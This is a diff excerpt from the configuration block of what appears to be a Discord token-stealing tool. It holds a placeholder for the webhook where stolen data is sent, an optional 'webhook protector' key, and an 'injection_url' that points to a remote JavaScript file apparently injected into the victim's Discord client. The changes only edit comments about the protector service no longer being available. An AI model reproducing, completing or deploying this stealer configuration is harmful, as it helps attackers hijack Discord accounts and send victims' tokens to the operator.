@@ -29,9 +29,9 @@ __version__ = '1.0.4'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    # Recommend using a webhook protector (when it's fixed)
     'webhook': "WEBHOOK_HERE", # Enter your webhook on this line by replacing "WEBHOOK_HERE"
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector # Token protector server side broken atm so I'm using the Webhook from the client side
+    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING THE TOKEN PROTECTOR # The token protector API I used has been taken off github so use your normal discord webhook for now until I come up with an alternative
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
